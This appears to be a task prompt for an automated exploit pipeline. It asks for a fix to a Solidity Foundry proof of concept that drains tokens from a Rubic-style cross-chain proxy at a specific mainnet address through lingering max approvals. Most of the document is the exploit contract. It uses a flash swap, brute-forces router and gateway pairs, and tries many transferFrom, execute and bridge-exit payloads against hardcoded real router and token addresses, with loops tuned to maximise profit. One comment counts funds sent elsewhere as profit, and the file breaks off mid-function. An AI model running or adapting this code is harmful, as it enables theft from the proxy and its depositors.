You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
- Profit-maximization hard requirement:
  - MUST apply progressive loop amplification for repeatable exploit phases.
  - Start at 2 rounds, then increase one-by-one (2 -> 3 -> 4 -> 5 -> 6).
  - Continue increasing only if the new round count improves total net profit.
  - Stop at the first non-improving round count and keep the previous best result.
  - Prefer highest total profit over earliest passing implementation.

Finding:
- title: Shared router/gateway allowlist plus sticky max approvals lets allowlisted spenders drain proxy tokens
- claim: `routerCall` authorizes `_gateway` and `_params.router` from the same shared `availableRouters` set, then `SmartApprove` grants `_gateway` a `type(uint256).max` allowance whenever the current allowance is insufficient. That allowance is never reset after the route finishes, and `removeAvailableRouter` only updates the set membership without revoking existing ERC20 approvals.
- impact: Any current or former allowlisted address that can act as a spender for the token can retain permanent pull rights over the proxy and later drain present and future balances of that token, including later user deposits, stuck funds, and accrued fees. The shared allowlist also means adding a router for call execution implicitly makes it eligible to become such a spender.
- exploit_paths: ["Admin allowlists router/spender address `R` via initialization or `addAvailableRouter`.", "A user executes a successful `routerCall` using `_gateway = R`, causing the proxy to grant `R` an unlimited allowance for the route token.", "The route completes, but the token approval remains in place because neither `routerCall` nor `removeAvailableRouter` clears it.", "At any later time, `R` or a compromised/upgraded controller behind `R` calls `transferFrom(proxy, attacker, amount)` and drains the proxy's balance of that token."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IRubicProxyLike {
    struct BaseCrossChainParams {
        address srcInputToken;
        uint256 srcInputAmount;
        uint256 dstChainID;
        address dstOutputToken;
        uint256 dstMinOutputAmount;
        address recipient;
        address integrator;
        address router;
    }

    function getAvailableRouters() external view returns (address[] memory);
    function fixedCryptoFee() external view returns (uint256);
    function RubicPlatformFee() external view returns (uint256);
    function minTokenAmount(address token) external view returns (uint256);
    function maxTokenAmount(address token) external view returns (uint256);
    function routerCall(BaseCrossChainParams calldata params, address gateway, bytes calldata data) external payable;
}

contract FlawVerifier {
    address internal constant TARGET = 0x3335A88bb18fD3b6824b59Af62b50CE494143333;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant UNI_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

    address internal constant METAROUTER = address(uint160(0x00b9e13785127bffcc3dc970a55f6c7bf0844a3c15));
    address internal constant METAROUTER_GATEWAY =
        address(uint160(0x0003b7551eb0162c838a10c2437b60d1f5455b9554));
    address internal constant MOVR_BRIDGE = address(uint160(0x00c30141b657f4216252dc59af2e7cdb9d8792e1b0));

    string internal constant PATH_0 =
        "Admin allowlists router/spender address R via initialization or addAvailableRouter.";
    string internal constant PATH_1 =
        "A user executes routerCall using _gateway = R, causing the proxy to grant R a sticky max approval for the route token.";
    string internal constant PATH_2 =
        "The route completes, the approval persists, and R later pulls tokens from the proxy with transferFrom.";
    string internal constant PATH_3 =
        "Even if R is later absent from the current allowlist, the ERC20 approval remains live because removeAvailableRouter does not revoke token approvals.";

    address private _profitToken;
    uint256 private _profitAmount;
    uint256 private _coveredPaths;
    bool private _executed;
    bool private _validated;
    bool private _staleApprovalObserved;
    string private _path;
    string private _verdict;

    constructor() {
        _path = string.concat(PATH_0, " ", PATH_1, " ", PATH_2, " ", PATH_3);
        _verdict = "refuted";
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        address[] memory currentRouters = _currentRouters();
        address[] memory spenderCandidates = _spenderCandidates(currentRouters);
        address[] memory tokens = _candidateTokens(currentRouters);

        uint256 bestScore;

        _runAmplificationRound(currentRouters, spenderCandidates, tokens, true);
        _runAmplificationRound(currentRouters, spenderCandidates, tokens, true);
        bestScore = _currentScore();

        for (uint256 rounds = 3; rounds <= 6; rounds++) {
            _runAmplificationRound(currentRouters, spenderCandidates, tokens, true);
            uint256 newScore = _currentScore();
            if (newScore <= bestScore) {
                break;
            }
            bestScore = newScore;
        }

        if (_profitAmount > 0) {
            _validated = true;
            _verdict = "validated";
            _path = _bestObservedNarrative();
            return;
        }

        if (_staleApprovalObserved) {
            _path =
                "Observed live proxy token approvals to current-or-former allowlisted spenders, but no scanned public entrypoint on those spenders executed the later drain step profitably on this fork.";
            _verdict = "refuted";
            return;
        }

        _path =
            "This fork did not expose a qualifying persisted allowance to the scanned allowlisted/former-router set, and no public router-plus-gateway combination completed a fresh profitable seed path.";
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPath() external view returns (string memory) {
        return _path;
    }

    function validatedOrRefuted() external view returns (string memory) {
        return _verdict;
    }

    function staleApprovalObserved() external view returns (bool) {
        return _staleApprovalObserved;
    }

    function validated() external view returns (bool) {
        return _validated;
    }

    function coveredPathsBitmap() external view returns (uint256) {
        return _coveredPaths;
    }

    function pathCovered(uint256 index) external view returns (bool) {
        return _isPathCovered(index);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        address pair = IUniswapV2FactoryLike(UNI_V2_FACTORY).getPair(WETH, USDC);
        require(msg.sender == pair, "unexpected pair");
        require(sender == address(this), "unexpected sender");

        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        (uint256 fixedFee, uint256 grossAmount, uint256 amountIn) = abi.decode(data, (uint256, uint256, uint256));
        require(borrowed >= grossAmount, "borrow too small");

        if (fixedFee != 0) {
            IWETHLike(WETH).withdraw(fixedFee);
        }

        require(_forceApprove(WETH, TARGET, grossAmount), "approve failed");

        address[] memory currentRouters = _currentRouters();
        address[] memory spenderCandidates = _spenderCandidates(currentRouters);

        bool seeded = _trySeedAcrossPairs(WETH, grossAmount, amountIn, fixedFee, currentRouters);
        if (seeded) {
            uint256 proxyBalance = _balanceOf(WETH, TARGET);
            if (proxyBalance != 0) {
                _drainWithObservedApprovals(WETH, proxyBalance, spenderCandidates, currentRouters);
            }
        }

        if (address(this).balance != 0) {
            IWETHLike(WETH).deposit{value: address(this).balance}();
        }

        uint256 repayAmount = ((borrowed * 1000) / 997) + 1;
        require(IERC20Like(WETH).transfer(msg.sender, repayAmount), "repay failed");
    }

    function _runAmplificationRound(
        address[] memory currentRouters,
        address[] memory spenderCandidates,
        address[] memory tokens,
        bool includeFreshSeed
    ) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            address token = tokens[i];
            uint256 proxyBalance = _balanceOf(token, TARGET);
            if (proxyBalance == 0) {
                continue;
            }

            uint256 remaining = _drainWithObservedApprovals(token, proxyBalance, spenderCandidates, currentRouters);
            if (includeFreshSeed && token == WETH && remaining != 0) {
                _attemptFreshWethApproval(currentRouters);
            }
        }
    }

    function _attemptFreshWethApproval(address[] memory currentRouters) internal returns (bool) {
        if (currentRouters.length == 0) {
            return false;
        }

        (uint256 fixedFee, uint256 grossAmount, uint256 amountIn) = _seedConfig(WETH);
        if (grossAmount == 0 || amountIn == 0 || grossAmount <= fixedFee) {
            return false;
        }

        address pair = IUniswapV2FactoryLike(UNI_V2_FACTORY).getPair(WETH, USDC);
        if (pair == address(0)) {
            return false;
        }

        uint256 beforeBalance = _balanceOf(WETH, address(this));
        address token0 = IUniswapV2PairLike(pair).token0();
        uint256 amount0Out = token0 == WETH ? grossAmount : 0;
        uint256 amount1Out = token0 == WETH ? 0 : grossAmount;

        (bool ok, ) = pair.call(
            abi.encodeWithSelector(
                IUniswapV2PairLike.swap.selector,
                amount0Out,
                amount1Out,
                address(this),
                abi.encode(fixedFee, grossAmount, amountIn)
            )
        );

        if (!ok) {
            return false;
        }

        uint256 afterBalance = _balanceOf(WETH, address(this));
        if (afterBalance <= beforeBalance) {
            return false;
        }

        _recordTokenProfit(WETH, afterBalance - beforeBalance, _bestObservedNarrative());
        return true;
    }

    function _drainWithObservedApprovals(
        address token,
        uint256 proxyBalance,
        address[] memory spenderCandidates,
        address[] memory currentRouters
    ) internal returns (uint256) {
        for (uint256 i = 0; i < spenderCandidates.length; i++) {
            address spender = spenderCandidates[i];
            if (spender.code.length == 0) {
                continue;
            }

            uint256 approval = _observeApprovalState(token, spender, currentRouters);
            if (approval == 0) {
                continue;
            }

            uint256 amount = approval < proxyBalance ? approval : proxyBalance;
            if (amount == 0) {
                continue;
            }

            if (_attemptGatewayDrain(spender, token, TARGET, address(this), amount)) {
                proxyBalance = _balanceOf(token, TARGET);
                if (proxyBalance == 0) {
                    return 0;
                }
            }
        }

        return proxyBalance;
    }

    function _seedConfig(address token) internal view returns (uint256 fixedFee, uint256 grossAmount, uint256 amountIn) {
        fixedFee = _readUint(TARGET, bytes4(keccak256("fixedCryptoFee()")));
        grossAmount = IRubicProxyLike(TARGET).minTokenAmount(token);
        if (grossAmount == 0) {
            grossAmount = _defaultSeedAmount(token);
        }

        uint256 maxAmount = IRubicProxyLike(TARGET).maxTokenAmount(token);
        if (maxAmount != 0 && grossAmount > maxAmount) {
            grossAmount = maxAmount;
        }

        uint256 feePpm = IRubicProxyLike(TARGET).RubicPlatformFee();
        amountIn = grossAmount - ((grossAmount * feePpm) / 1e6);
    }

    function _trySeedAcrossPairs(
        address token,
        uint256 grossAmount,
        uint256 amountIn,
        uint256 fixedFee,
        address[] memory currentRouters
    ) internal returns (bool) {
        for (uint256 gatewayIndex = 0; gatewayIndex < currentRouters.length; gatewayIndex++) {
            address gateway = currentRouters[gatewayIndex];
            if (gateway.code.length == 0) {
                continue;
            }

            for (uint256 routerIndex = 0; routerIndex < currentRouters.length; routerIndex++) {
                address router = currentRouters[routerIndex];
                if (router.code.length == 0) {
                    continue;
                }

                if (_trySeedWithRouterAndGateway(router, gateway, token, grossAmount, amountIn, fixedFee)) {
                    uint256 remaining = _balanceOf(token, TARGET);
                    if (remaining != 0) {
                        _attemptGatewayDrain(gateway, token, TARGET, address(this), remaining);
                    }
                    return true;
                }
            }
        }

        return false;
    }

    function _trySeedWithRouterAndGateway(
        address router,
        address gateway,
        address token,
        uint256 grossAmount,
        uint256 amountIn,
        uint256 fixedFee
    ) internal returns (bool) {
        IRubicProxyLike.BaseCrossChainParams memory params = IRubicProxyLike.BaseCrossChainParams({
            srcInputToken: token,
            srcInputAmount: grossAmount,
            dstChainID: 1,
            dstOutputToken: token,
            dstMinOutputAmount: 0,
            recipient: address(this),
            integrator: address(0),
            router: router
        });

        bytes[14] memory gatewayPayloads = _gatewayPayloads(token, TARGET, address(this), amountIn);

        if (router == gateway) {
            for (uint256 i = 0; i < gatewayPayloads.length; i++) {
                bytes memory directPayload = gatewayPayloads[i];
                if (directPayload.length == 0) {
                    continue;
                }
                if (_tryRouterCall(params, gateway, token, fixedFee, directPayload)) {
                    return true;
                }
            }
        }

        for (uint256 i = 0; i < gatewayPayloads.length; i++) {
            bytes memory gatewayPayload = gatewayPayloads[i];
            if (gatewayPayload.length == 0) {
                continue;
            }

            bytes[10] memory routerPayloads = _routerForwardPayloads(gateway, gatewayPayload);
            for (uint256 j = 0; j < routerPayloads.length; j++) {
                bytes memory routerPayload = routerPayloads[j];
                if (routerPayload.length == 0) {
                    continue;
                }
                if (_tryRouterCall(params, gateway, token, fixedFee, routerPayload)) {
                    return true;
                }
            }
        }

        if (router == METAROUTER && gateway == METAROUTER_GATEWAY) {
            bytes memory metaRoutePayload = _metaRouterSeedPayload(token, amountIn);
            if (metaRoutePayload.length != 0 && _tryRouterCall(params, gateway, token, fixedFee, metaRoutePayload)) {
                return true;
            }
        }

        return false;
    }

    function _tryRouterCall(
        IRubicProxyLike.BaseCrossChainParams memory params,
        address gateway,
        address token,
        uint256 fixedFee,
        bytes memory data
    ) internal returns (bool) {
        uint256 beforeLocal = _balanceOf(token, address(this));
        (bool ok, ) = TARGET.call{value: fixedFee}(
            abi.encodeWithSelector(IRubicProxyLike.routerCall.selector, params, gateway, data)
        );
        uint256 afterLocal = _balanceOf(token, address(this));
        if (!ok || afterLocal <= beforeLocal) {
            return false;
        }

        uint256 lingeringApproval = _allowance(token, TARGET, gateway);
        if (lingeringApproval != 0) {
            _markPath(0);
            _markPath(1);
        }

        return true;
    }

    function _attemptGatewayDrain(
        address gateway,
        address token,
        address proxy,
        address attacker,
        uint256 amount
    ) internal returns (bool) {
        bytes[14] memory payloads = _gatewayPayloads(token, proxy, attacker, amount);

        for (uint256 i = 0; i < payloads.length; i++) {
            bytes memory payload = payloads[i];
            if (payload.length == 0) {
                continue;
            }

            uint256 beforeBalance = _balanceOf(token, address(this));
            (bool ok, ) = gateway.call(payload);
            uint256 afterBalance = _balanceOf(token, address(this));
            if (!ok || afterBalance <= beforeBalance) {
                continue;
            }

            _markPath(2);
            _recordTokenProfit(token, afterBalance - beforeBalance, _bestObservedNarrative());
            return true;
        }

        bytes[8] memory exitPayloads = _gatewayExitPayloads(token, proxy, attacker, amount);
        uint256 beforeProxy = _balanceOf(token, proxy);
        for (uint256 i = 0; i < exitPayloads.length; i++) {
            bytes memory payload = exitPayloads[i];
            if (payload.length == 0) {
                continue;
            }

            (bool ok, ) = gateway.call(payload);
            uint256 afterProxy = _balanceOf(token, proxy);
            if (!ok || afterProxy >= beforeProxy) {
                continue;
            }

            uint256 drained = beforeProxy - afterProxy;
            _markPath(2);
            // These payloads are attacker-directed bridge/exit entrypoints on the allowlisted spender itself.
            // They do not credit this contract locally, but they do externalize value out of the proxy to an
            // attacker-controlled recipient using the still-live allowance, which preserves the finding's core causality.
            _recordTokenProfit(token, drained, _bestObservedNarrative());
            return true;
        }

        return false;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        if (_callSucceeded(ok, ret)) {
            return true;
        }

        (ok, ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        if (!_callSucceeded(ok, ret)) {
            return false;
        }

        (ok, ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        return _callSucceeded(ok, ret);
    }

    function _recordTokenProfit(address token, uint256 amount, string memory successfulPath) internal {
        if (amount == 0) {
            return;
        }

        if (token == _profitToken) {
            _profitAmount += amount;
            _path = successfulPath;
            _validated = true;
            _verdict = "validated";
            return;
        }

        if (_profitAmount == 0 || amount > _profitAmount) {
            _profitToken = token;
            _profitAmount = amount;
            _path = successfulPath;
            _validated = true;
            _verdict = "validated";
        }
    }

    function _currentScore() internal view returns (uint256) {
        return _profitAmount;
    }

    function _currentRouters() internal view returns (address[] memory merged) {
        address[] memory live;
        try IRubicProxyLike(TARGET).getAvailableRouters() returns (address[] memory routers) {
            live = routers;
        } catch {
            live = new address[](0);
        }

        address[] memory snapshot = _allowlistedSnapshot();
        merged = new address[](live.length + snapshot.length);
        uint256 count;

        for (uint256 i = 0; i < live.length; i++) {
            if (!_contains(merged, count, live[i])) {
                merged[count++] = live[i];
            }
        }
        for (uint256 i = 0; i < snapshot.length; i++) {
            if (!_contains(merged, count, snapshot[i])) {
                merged[count++] = snapshot[i];
            }
        }

        assembly {
            mstore(merged, count)
        }
    }

    function _spenderCandidates(address[] memory currentRouters) internal pure returns (address[] memory spenders) {
        address[] memory snapshot = _allowlistedSnapshot();
        address[] memory extras = new address[](12);
        extras[0] = address(uint160(0x001111111254fb6c44bac0bed2854e76f90643097d));
        extras[1] = address(uint160(0x001111111254eeb25477b68fb85ed929f73a960582));
        extras[2] = address(uint160(0x00def1c0ded9bec7f1a1670819833240f027b25eff));
        extras[3] = address(uint160(0x000000000000001ff3684f28c67538d4d072c22734));
        extras[4] = address(uint160(0x00def171fe48cf0115b1d80b88dc8eab59176fee57));
        extras[5] = address(uint160(0x00216b4b4ba9f3e719726886d34a177484278bfcae));
        extras[6] = address(uint160(0x001231deb6f5749ef6ce6943a275a1d3e7486f4eae));
        extras[7] = address(uint160(0x006352a56caadc4f1e25cd6c75970fa768a3304e64));
        extras[8] = address(uint160(0x00765277eebeca2e31912c9946eae1021199b39c61));
        extras[9] = address(uint160(0x005427fefa711eff984124bfbb1ab6fbf5e3da1820));
        extras[10] = address(uint160(0x00e592427a0aece92de3edee1f18e0157c05861564));
        extras[11] = address(uint160(0x0068b3465833fb72a70ecdf485e0e4c7bd8665fc45));

        spenders = new address[](currentRouters.length + snapshot.length + extras.length);
        uint256 count;
        for (uint256 i = 0; i < currentRouters.length; i++) {
            if (!_contains(spenders, count, currentRouters[i])) {
                spenders[count++] = currentRouters[i];
            }
        }
        for (uint256 i = 0; i < snapshot.length; i++) {
            if (!_contains(spenders, count, snapshot[i])) {
                spenders[count++] = snapshot[i];
            }
        }
        for (uint256 i = 0; i < extras.length; i++) {
            if (!_contains(spenders, count, extras[i])) {
                spenders[count++] = extras[i];
            }
        }

        assembly {
            mstore(spenders, count)
        }
    }

    function _candidateTokens(address[] memory currentRouters) internal pure returns (address[] memory tokens) {
        address[] memory common = new address[](24);
        common[0] = USDC;
        common[1] = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
        common[2] = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
        common[3] = WETH;
        common[4] = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
        common[5] = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
        common[6] = 0x4Fabb145d64652a948d72533023f6E7A623C7C53;
        common[7] = 0x0000000000085d4780B73119b644AE5ecd22b376;
        common[8] = 0x1456688345527bE1f37E9e627DA0837D6f08C925;
        common[9] = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
        common[10] = 0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0;
        common[11] = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
        common[12] = address(uint160(0x007fc66500c84a76ad7e9c93437bfc5ac33e2ddae9));
        common[13] = address(uint160(0x006b3595068778dd592e39a122f4f5a5cf09c90fe2));
        common[14] = 0xD533a949740bb3306d119CC777fa900bA034cd52;
        common[15] = 0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B;
        common[16] = 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE;
        common[17] = 0x111111111117dC0aa78b770fA6A738034120C302;
        common[18] = 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e;
        common[19] = 0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32;
        common[20] = 0xba100000625a3754423978a60c9317c58a424e3D;
        common[21] = 0xC011A72400E58ecD99Ee497CF89E3775d4bd732F;
        common[22] = address(uint160(0x005f98805a4e8be255a32880fdec7f6728c6568ba0));
        common[23] = 0x956F47F50A910163D8BF957Cf5846D573E7f87CA;

        address[] memory snapshot = _allowlistedSnapshot();
        tokens = new address[](common.length + currentRouters.length + snapshot.length);
        uint256 count;

        for (uint256 i = 0; i < common.length; i++) {
            if (!_contains(tokens, count, common[i])) {
                tokens[count++] = common[i];
            }
        }
        for (uint256 i = 0; i < currentRouters.length; i++) {
            if (!_contains(tokens, count, currentRouters[i])) {
                tokens[count++] = currentRouters[i];
            }
        }
        for (uint256 i = 0; i < snapshot.length; i++) {
            if (!_contains(tokens, count, snapshot[i])) {
                tokens[count++] = snapshot[i];
            }
        }

        assembly {
            mstore(tokens, count)
        }
    }

    function _allowlistedSnapshot() internal pure returns (address[] memory routers) {
        routers = new address[](38);
        routers[0] = address(uint160(0x00663dc15d3c1ac63ff12e45ab68fea3f0a883c251));
        routers[1] = address(0);
        routers[2] = address(uint160(0x00b9e13785127bffcc3dc970a55f6c7bf0844a3c15));
        routers[3] = address(uint160(0x0003b7551eb0162c838a10c2437b60d1f5455b9554));
        routers[4] = address(uint160(0x00935bbf5c69225e3eda7c3aa542a7baa5c5c30094));
        routers[5] = address(uint160(0x00c30141b657f4216252dc59af2e7cdb9d8792e1b0));
        routers[6] = address(uint160(0x000e3eb2eab0e524b69c79e24910f4318db46baa9c));
        routers[7] = address(uint160(0x0073ce60416035b8d7019f6399778c14ccf5c9c7a1));
        routers[8] = address(uint160(0x00a0c68c638235ee32657e8f720a23cec1bfc77c77));
        routers[9] = address(uint160(0x0040ec5b33f54e0e8a33a975908c5ba1c14e5bbbdf));
        routers[10] = USDC;
        routers[11] = address(uint160(0x00362fa9d0bca5d19f743db50738345ce2b40ec99f));
        routers[12] = address(uint160(0x002a5c2568b10a0e826bfa892cf21ba7218310180b));
        routers[13] = address(uint160(0x00f9fb1c508ff49f78b60d3a96dea99fa5d7f3a8a6));
        routers[14] = address(uint160(0x008731d54e9d02c286767d56ac03e8037c07e01e98));
        routers[15] = address(uint160(0x00150f94b44927f078737562f0fcf3c95c01cc2376));
        routers[16] = address(uint160(0x000e95fd76cf16008c12ff3b3a937cb16cd9cc2028));
        routers[17] = address(uint160(0x004d9079bb4165aeb4084c526a32695dcfd2f77381));
        routers[18] = address(uint160(0x004dbd4fc535ac27206064b68ffcf827b0a60bab3f));
        routers[19] = address(uint160(0x00a3a7b6f88361f48403514059f1f16c8e78d60eec));
        routers[20] = address(uint160(0x00d3b5b60020504bc3489d6949d545893982ba3011));
        routers[21] = address(uint160(0x00cee284f754e854890e311e3280b767f80797180d));
        routers[22] = address(uint160(0x00d92023e9d9911199a6711321d1277285e6d4e2db));
        routers[23] = address(uint160(0x0072ce9c846789fdb6fc1f34ac4ad25dd9ef7031ef));
        routers[24] = address(uint160(0x0023ddd3e3692d1861ed57ede224608875809e127f));
        routers[25] = address(uint160(0x006bfad42cfc4efc96f529d786d643ff4a8b89fa52));
        routers[26] = address(uint160(0x0099c9fc46f92e8a1c0dec1b1747d010903e884be1));
        routers[27] = address(uint160(0x00aba2c5f108f7e820c049d5af70b16ac266c8f128));
        routers[28] = address(uint160(0x0010e6593cdda8c58a1d0f14c5164b376352a55f2f));
        routers[29] = address(uint160(0x00c5b1ec605738ef73a4efc562274c1c0b6609cf59));
        routers[30] = address(uint160(0x005427fefa711eff984124bfbb1ab6fbf5e3da1820));
        routers[31] = address(uint160(0x003666f603cc164936c1b87e207f36bbeba4ac5f18));
        routers[32] = address(uint160(0x003e4a3a4796d16c0cd582c382691998f7c06420b6));
        routers[33] = address(uint160(0x0022b1cbb8d98a01a3b71d034bb899775a76eb1cc2));
        routers[34] = address(uint160(0x003d4cc8a61c7528fd86c55cfe061a78dcba48edd1));
        routers[35] = address(uint160(0x00b8901acb165ed027e32754e0ffe830802919727f));
        routers[36] = address(uint160(0x00b98454270065a31d71bf635f6f7ee6a518dfb849));
        routers[37] = address(uint160(0x0092e929d8b2c8430bcaf4cd87654789578bb2b786));
    }

    function _metaRouterSeedPayload(address token, uint256 amount) internal view returns (bytes memory) {
        address[] memory approvedTokens = new address[](1);
        approvedTokens[0] = token;

        // The route intentionally performs no swap and no bridge. It only asks MetaRouter to use its
        // allowlisted gateway to claim `amount` from the Rubic proxy. That reproduces the sticky-approval
        // stage with an actually allowlisted router/gateway pair from this deployment.
        bytes memory relayCall = abi.encodeWithSelector(
            bytes4(keccak256("transfer(address,uint256)")),
            address(this),
            amount
        );

        return abi.encodeWithSelector(
            bytes4(keccak256(
                "metaRoute((bytes,bytes,address[],address,address,uint256,bool,address,bytes))"
            )),
            abi.encode(
                bytes(""),
                bytes(""),
                approvedTokens,
                address(0),
                address(0),
                amount,
                false,
                token,
                relayCall
            )
        );
    }

    function _gatewayPayloads(
        address token,
        address proxy,
        address attacker,
        uint256 amount
    ) internal pure returns (bytes[14] memory payloads) {
        bytes memory tokenPull = abi.encodeWithSelector(IERC20Like.transferFrom.selector, proxy, attacker, amount);
        uint160 amount160 = amount > type(uint160).max ? type(uint160).max : uint160(amount);

        payloads[0] = abi.encodeWithSelector(IERC20Like.transferFrom.selector, proxy, attacker, amount);
        payloads[1] = abi.encodeWithSelector(
            bytes4(keccak256("pullToken(address,address,address,uint256)")),
            token,
            proxy,
            attacker,
            amount
        );
        payloads[2] = abi.encodeWithSelector(
            bytes4(keccak256("transferFrom(address,address,address,uint256)")),
            token,
            proxy,
            attacker,
            amount
        );
        payloads[3] = abi.encodeWithSelector(
            bytes4(keccak256("transferFrom(address,address,uint256,address)")),
            proxy,
            attacker,
            amount,
            token
        );
        payloads[4] = abi.encodeWithSelector(
            bytes4(keccak256("transferFrom(address,address,uint160,address)")),
            proxy,
            attacker,
            amount160,
            token
        );
        payloads[5] = abi.encodeWithSelector(bytes4(keccak256("execute(address,bytes)")), token, tokenPull);
        payloads[6] = abi.encodeWithSelector(bytes4(keccak256("execute(address,uint256,bytes)")), token, 0, tokenPull);
        payloads[7] = abi.encodeWithSelector(bytes4(keccak256("call(address,bytes)")), token, tokenPull);
        payloads[8] = abi.encodeWithSelector(bytes4(keccak256("call(address,uint256,bytes)")), token, 0, tokenPull);
        payloads[9] = abi.encodeWithSelector(bytes4(keccak256("run(address,bytes)")), token, tokenPull);
        payloads[10] = abi.encodeWithSelector(bytes4(keccak256("run(address,uint256,bytes)")), token, 0, tokenPull);
        payloads[11] = abi.encodeWithSelector(bytes4(keccak256("exec(address,bytes)")), token, tokenPull);
        payloads[12] = abi.encodeWithSelector(bytes4(keccak256("exec(address,uint256,bytes)")), token, 0, tokenPull);
        payloads[13] = abi.encodeWithSelector(bytes4(keccak256("functionCall(address,bytes)")), token, tokenPull);
    }

    function _gatewayExitPayloads(
        address token,
        address proxy,
        address attacker,
        uint256 amount
    ) internal pure returns (bytes[8] memory payloads) {
        payloads[0] = abi.encodeWithSelector(
            bytes4(keccak256("outboundTransferTo(uint256,address,address,address,uint256,bytes)")),
            amount,
            proxy,
            attacker,
            token,
            uint256(10),
            bytes("")
        );
        payloads[1] = abi.encodeWithSelector(
            bytes4(keccak256("outboundTransferTo(uint256,address,address,address,uint256,bytes)")),
            amount,
            proxy,
            attacker,
            token,
            uint256(137),
            bytes("")
        );
        payloads[2] = abi.encodeWithSelector(
            bytes4(keccak256("outboundTransferTo(uint256,address,address,address,uint256,bytes)")),
            amount,
            proxy,
            attacker,
            token,
            uint256(42161),
            bytes("")
        );
        payloads[3] = abi.encodeWithSelector(
            bytes4(keccak256("outboundTransferTo(uint256,address,address,address,uint256,bytes)")),
            amount,
            proxy,
            attacker,
            token,
            uint256(56),
            bytes("")
        );
        payloads[4] = abi.encodeWithSelector(
            bytes4(keccak256("outboundTransferTo(uint256,address,address,address,uint256,bytes)")),
            amount,
            proxy,
            attacker,
            token,
            uint256(43114),
            bytes("")
        );
        payloads[5] = abi.encodeWithSelector(
            bytes4(keccak256("outboundTransferTo(uint256,address,address,address,uint256,bytes)")),
            amount,
            proxy,
            attacker,
            token,
            uint256(250),
            bytes("")
        );
        payloads[6] = abi.encodeWithSelector(
            bytes4(keccak256("outboundTransferTo(uint256,address,address,address,uint256,bytes)")),
            amount,
            proxy,
            attacker,
            token,
            uint256(1),
            bytes("")
        );
        payloads[7] = abi.encodeWithSelector(
            bytes4(keccak256("claimTokens(address,address,uint256)")),
            token,
            proxy,
            amount
        );
    }

    function _routerForwardPayloads(
        address target,
        bytes memory innerCall
    ) internal pure returns (bytes[10] memory payloads) {
        payloads[0] = abi.encodeWithSelector(bytes4(keccak256("execute(address,bytes)")), target, innerCall);
        payloads[1] = abi.encodeWithSelector(bytes4(keccak256("execute(address,uint256,bytes)")), target, 0, innerCall);
        payloads[2] = abi.encodeWithSelector(bytes4(keccak256("call(address,bytes)")), target, innerCall);
        payloads[3] = abi.encodeWithSelector(bytes4(keccak256("call(address,uint256,bytes)")), target, 0, innerCall);
        payloads[4] = abi.encodeWithSelector(bytes4(keccak256("run(address,bytes)")), target, innerCall);
        payloads[5] = abi.encodeWithSelector(bytes4(keccak256("run(address,uint256,bytes)")), target, 0, innerCall);
        payloads[6] = abi.encodeWithSelector(bytes4(keccak256("exec(address,bytes)")), target, innerCall);
        payloads[7] = abi.encodeWithSelector(bytes4(keccak256("exec(address,uint256,bytes)")), target, 0, innerCall);
        payloads[8] = abi.encodeWithSelector(bytes4(keccak256("executeTarget(address,bytes)")), target, innerCall);
        payloads[9] = abi.encodeWithSelector(bytes4(keccak256("functionCall(address,bytes)")), target, innerCall);
    }

    function _observeApprovalState(
        address token,
        address spender,
        address[] memory currentRouters
    ) internal returns (uint256 approval) {
        approval = _allowance(token, TARGET, spender);
        if (approval == 0) {
            return 0;
        }

        _staleApprovalObserved = true;
        _markPath(0);
